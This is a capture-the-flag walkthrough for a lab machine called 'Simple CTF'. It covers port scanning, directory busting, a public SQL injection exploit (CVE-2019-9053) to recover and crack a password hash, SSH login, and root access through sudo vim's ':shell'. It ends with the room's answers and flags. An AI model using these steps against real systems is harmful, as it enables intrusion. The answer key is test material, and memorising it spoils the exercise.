# Simple CTF

> Lorenzo De Simone | 19.05.2023

----------------------------------------

- [Simple CTF](#simple-ctf)
  - [Hosts](#hosts)
  - [Enumeration](#enumeration)
    - [nmap](#nmap)
    - [Directory Busting](#directory-busting)
  - [Exploitation](#exploitation)
    - [Accessing the System](#accessing-the-system)
    - [Privilege Escalation](#privilege-escalation)
  - [Flags](#flags)

## Hosts

```bash
export IP=10.10.93.22
``` 

## Enumeration

### nmap

```bash
sudo nmap -sC -sV -oN nmap/initial 10.10.93.22
sudo nmap -p- -oN nmap/full 10.10.93.22
sudo nmap -p 1000 10.10.93.22 
``` 

> Port 21 is open = ftp server,  anonymous login enabled 
> Port 80 is open = http webserver
> Port 2222 is open = ssh 

### Directory Busting

```bash
gobuster dir -u http://10.10.93.22/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
``` 

> Found directory /simple
> It appears to be a CMS system, vulnerable to SQLi Attacks

## Exploitation

### Accessing the System

```bash
python 46635.py -u http://10.10.93.22/simple --crack 10k-most-common.txt
``` 

> Cracking with the exploit failed, but we got the hash and the salt for mitch's password.

```
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
``` 

```bash
hashcat -m 20 -a 0 crack.txt 10k-most-common.txt
```

> Haschat was able to crack the password
> Logged in as the mitch user using ssh (tcp/2222)
> Found the user flag in ```/home/mitch```

### Privilege Escalation

```bash
$ sudo -l      
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
``` 

> Mitch can run the vim command as sudo, this can probably be abused in order to privesc

```bash
$ sudo vim
:shell
```

> Starting vim as sudo and the using the ```:shell``` we have a root shell. 
> Found the root flag in ```/root```

## Flags 

1. How many services are running under port 1000?
> 2

2. What is running on the higher port?
> ssh

3. What's the CVE you're using against the application?
> CVE-2019-9053

3. To what kind of vulnerability is the application vulnerable?
> SQLi

4. What's the password?
> secret

5. Where can you login with the details obtained
> ssh

6. What's the user flag?
> G00d j0b, keep up!

7. Is there any other user in the home directory? What's its name?
> sunbath

8. What can you leverage to spawn a privileged shell?
> vim

9. What's the root flag?
> W3ll d0n3. You made it!